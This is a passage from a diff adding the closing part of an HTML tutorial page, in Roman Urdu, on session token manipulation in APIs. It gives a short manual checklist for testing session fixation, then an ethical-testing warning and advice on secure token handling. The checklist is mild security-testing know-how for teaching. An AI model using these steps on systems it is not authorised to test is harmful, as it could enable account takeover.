+                    <h3>Test 5: Session Fixation</h3>
+                    <p>
+                        Session fixation vulnerability check karen.
+                    </p>
+                    <ol>
+                        <li>Pre-login session ID note karen</li>
+                        <li>Login karen</li>
+                        <li>Post-login session ID check karen</li>
+                        <li>Agar same hai to vulnerable</li>
+                        <li>Pre-set session ID ke saath login try karen</li>
+                    </ol>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h4>⚠️ Ethical Testing Warning</h4>
+                <p>
+                    Session token manipulation testing sirf authorized environments par karein. Production systems par unauthorized testing illegal hai aur serious consequences ho sakte hain. Hamesha proper authorization, bug bounty programs, ya signed agreements ke saath testing karein. Doosron ke tokens ko manipulate karna crime hai.
+                </p>
+            </div>
+
+            <div class="key-point">
+                <h4>💡 Ahem Nuqta</h4>
+                <p>
+                    <strong>Session Token Manipulation</strong> API security mein buhat ahum topic hai kyunki APIs authentication aur authorization ke liye tokens par buhat ziada depend karti hain. Ek compromise ya manipulate kiya gaya token account takeover ya sensitive data aur functions tak ghair-mutalliq pahunch ka sabab ban sakta hai. Proper token generation, validation, aur management zaroori hai.
+                </p>
+            </div>
+
+            <div class="conclusion">
+                <h3>📌 Khulasa</h3>
+                <p>
+                    Session Token Manipulation modern authentication systems ke liye ek critical threat hai. Tokens ko properly implement karna - secure generation se le kar proper validation aur timely invalidation tak - har application ki security ki bunyad hai.
+                </p>
+                <p style="margin-top: 15px;">
+                    Developers ko chahiye ke wo token-based authentication implement karte waqt cryptographic best practices follow karen, secure cookie flags use karen, aur comprehensive session management implement karen. Regular security audits aur penetration testing se token-related vulnerabilities ko identify kiya ja sakta hai.
+                </p>
+                <p style="margin-top: 15px;">
+                    <strong>Yaad rakhein:</strong> Token hi aapki pehchan hai digital world mein. Uski security compromise hone ka matlab hai aapki identity ka compromise hona. Isliye token security ko seriously len!
+                </p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
